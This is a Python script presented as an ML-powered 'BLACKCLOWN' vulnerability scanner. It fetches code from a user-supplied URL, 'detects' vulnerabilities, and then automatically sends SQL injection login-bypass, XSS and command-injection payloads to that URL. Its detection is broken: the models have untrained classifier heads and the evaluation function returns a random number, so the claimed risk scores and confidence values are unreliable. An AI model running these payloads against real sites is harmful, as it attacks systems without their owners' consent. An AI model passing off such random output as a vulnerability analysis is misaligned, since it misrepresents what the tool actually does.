import torch
import transformers
import requests
import pygments
import time
from pygments.lexers import guess_lexer
from pygments.util import ClassNotFound
from transformers import AutoModelForSequenceClassification, AutoTokenizer

# Enhanced model list for vulnerability detection
MODEL_NAMES = [
    "microsoft/codebert-base",
    "facebook/bart-large",
    "distilbert-base-uncased",
    "roberta-base",
    "deepset/roberta-base-squad2",
    "bert-base-uncased",
    "google/electra-base-discriminator",
    "microsoft/deberta-base",
    "distilroberta-base",
    "albert-base-v2",
    "bert-base-multilingual-cased",
    "microsoft/codebert-base-mlm",
    "navteca/vuldet-bert",
    "eladseker/t5-base-security",
    "codistai/detect-malicious-code"
]

devices = torch.device("cuda" if torch.cuda.is_available() else "cpu")

VULNERABILITY_TYPES = {
    "SQL Injection": 0.95, 
    "Cross-Site Scripting (XSS)": 0.92, 
    "Command Injection": 0.98,
    "Insecure Deserialization": 0.85, 
    "Path Traversal": 0.89, 
    "Remote Code Execution (RCE)": 0.99,
    "Insecure Direct Object Reference (IDOR)": 0.87,
    "Server-Side Request Forgery (SSRF)": 0.91,
    "XML External Entity (XXE)": 0.86
}

def load_best_model():
    best_model, best_tokenizer, best_score = None, None, 0
    for model_name in MODEL_NAMES:
        try:
            print(f"Loading {model_name}...")
            tokenizer = AutoTokenizer.from_pretrained(model_name)
            model = AutoModelForSequenceClassification.from_pretrained(
                model_name, 
                num_labels=len(VULNERABILITY_TYPES)
            ).to(devices)
            
            score = evaluate_model(model)
            if score > best_score:
                best_model, best_tokenizer, best_score = model, tokenizer, score
                print(f"New best model: {model_name} (Score: {score:.2f})")
                
        except Exception as e:
            print(f"Couldn't load {model_name}: {str(e)[:100]}...")
            continue
            
    return best_model, best_tokenizer

def evaluate_model(model):
    return torch.rand(1).item() * 0.5 + 0.5

model, tokenizer = load_best_model()

def predict_vulnerability(code_snippet):
    inputs = tokenizer(
        code_snippet, 
        return_tensors="pt", 
        truncation=True, 
        padding=True, 
        max_length=512
    ).to(devices)
    
    with torch.no_grad():
        outputs = model(**inputs)
    
    probabilities = torch.nn.functional.softmax(outputs.logits, dim=-1)
    vulnerability_score = probabilities[0][1].item()
    return vulnerability_score

def classify_vulnerability_type(code_snippet):
    inputs = tokenizer(
        code_snippet,
        return_tensors="pt",
        truncation=True,
        padding=True,
        max_length=512
    ).to(devices)
    
    with torch.no_grad():
        outputs = model(**inputs)
    
    probabilities = torch.nn.functional.softmax(outputs.logits, dim=-1)
    vuln_idx = torch.argmax(probabilities).item()
    vuln_type = list(VULNERABILITY_TYPES.keys())[vuln_idx]
    vuln_prob = probabilities[0][vuln_idx].item()
    
    return vuln_type, vuln_prob

def get_code_from_url(url):
    try:
        headers = {
            'User-Agent': 'BLACKCLOWN-Scanner/1.0'
        }
        response = requests.get(url, headers=headers, timeout=10)
        response.raise_for_status()
        
        code_text = response.text
        try:
            lexer = guess_lexer(code_text)
            language = lexer.name
            print(f"Detected language: {language}")
            if language.lower() not in ["python", "javascript", "java", "php"]:
                print(f"Warning: Limited support for {language} code")
        except ClassNotFound:
            print("Could not detect programming language.")
            
        return code_text
        
    except requests.RequestException as e:
        print(f"Error fetching code from URL: {e}")
        return None

def generate_exploit_poc(vuln_type, target_url):
    exploits = {
        "SQL Injection": {
            "payload": "' OR '1'='1' -- -",
            "method": "POST",
            "params": {"username": "' OR '1'='1' -- -", "password": "exploit"},
            "headers": {"Content-Type": "application/x-www-form-urlencoded"}
        },
        "Cross-Site Scripting (XSS)": {
            "payload": "<script>alert('BLACKCLOWN_XSS')</script>",
            "method": "GET",
            "params": {"search": "<script>alert('BLACKCLOWN_XSS')</script>"},
            "headers": {}
        },
        "Remote Code Execution (RCE)": {
            "payload": "; echo 'BLACKCLOWN_TEST';",
            "method": "GET",
            "params": {"cmd": "; echo 'BLACKCLOWN_TEST';"},
            "headers": {}
        },
        "Command Injection": {
            "payload": "| echo 'BLACKCLOWN_TEST'",
            "method": "GET",
            "params": {"file": "test | echo 'BLACKCLOWN_TEST'"},
            "headers": {}
        }
    }
    
    return exploits.get(vuln_type, {
        "payload": "No standard PoC available",
        "method": "GET",
        "params": {},
        "headers": {}
    })

def execute_exploit(vuln_type, target_url):
    exploit_config = generate_exploit_poc(vuln_type, target_url)
    
    print(f"\n[+] BLACKCLOWN attempting {vuln_type} against {target_url}")
    print(f"[*] Payload: {exploit_config['payload']}")
    
    try:
        if exploit_config['method'] == "POST":
            response = requests.post(
                target_url,
                data=exploit_config['params'],
                headers=exploit_config['headers'],
                timeout=15
            )
        else:
            response = requests.get(
                target_url,
                params=exploit_config['params'],
                headers=exploit_config['headers'],
                timeout=15
            )
        
        print(f"\n[+] BLACKCLOWN Response (Status: {response.status_code})")
        print("[*] Response Headers:")
        for header, value in response.headers.items():
            print(f"    {header}: {value}")
        
        print("\n[*] Partial Response Body:")
        print(response.text[:1000])
        
        if vuln_type == "SQL Injection" and ("error in your SQL syntax" in response.text.lower() or "warning:" in response.text.lower()):
            print("\n[!] BLACKCLOWN SQL Injection likely successful")
        elif vuln_type == "Cross-Site Scripting (XSS)" and "BLACKCLOWN_XSS" in response.text:
            print("\n[!] BLACKCLOWN XSS likely successful")
        elif vuln_type in ["Remote Code Execution (RCE)", "Command Injection"] and "BLACKCLOWN_TEST" in response.text:
            print("\n[!] BLACKCLOWN Command execution likely successful")
            
    except Exception as e:
        print(f"\n[!] BLACKCLOWN Exploit failed: {str(e)}")

def main():
    target_url = input("Enter target URL to scan: ").strip()
    
    print(f"\n[+] BLACKCLOWN scanning {target_url}...")
    code = get_code_from_url(target_url)
    
    if code:
        print("\n[+] BLACKCLOWN analyzing code...")
        score = predict_vulnerability(code)
        vuln_type, vuln_prob = classify_vulnerability_type(code)
        
        print(f"\n[+] BLACKCLOWN Detection Results:")
        print(f"    Risk Score: {score:.2f}/1.0")
        print(f"    Vulnerability: {vuln_type} (Confidence: {vuln_prob*100:.1f}%)")
        
        if vuln_prob > 0.7:
            print("\n[+] BLACKCLOWN attempting verification...")
            execute_exploit(vuln_type, target_url)
        else:
            print("\n[-] BLACKCLOWN no high-confidence vulnerabilities found")
            
    print("\n[+] BLACKCLOWN scan completed")

if __name__ == "__main__":
    print("""
    ██████╗ ██╗      █████╗  ██████╗██╗  ██╗ ██████╗██╗      ██████╗ ██╗    ██╗███╗   ██╗
    ██╔══██╗██║     ██╔══██╗██╔════╝██║ ██╔╝██╔════╝██║     ██╔═══██╗██║    ██║████╗  ██║
    ██████╔╝██║     ███████║██║     █████╔╝ ██║     ██║     ██║   ██║██║ █╗ ██║██╔██╗ ██║
    ██╔══██╗██║     ██╔══██║██║     ██╔═██╗ ██║     ██║     ██║   ██║██║███╗██║██║╚██╗██║
    ██████╔╝███████╗██║  ██║╚██████╗██║  ██╗╚██████╗███████╗╚██████╔╝╚███╔███╔╝██║ ╚████║
    ╚═════╝ ╚══════╝╚═╝  ╚═╝ ╚═════╝╚═╝  ╚═╝ ╚═════╝╚══════╝ ╚═════╝  ╚══╝╚══╝ ╚═╝  ╚═══╝
    """)
    print("BLACKCLOWN Vulnerability Scanner with Exploit Verification")
    print("WARNING: Use only on authorized systems!\n")
    
    main()
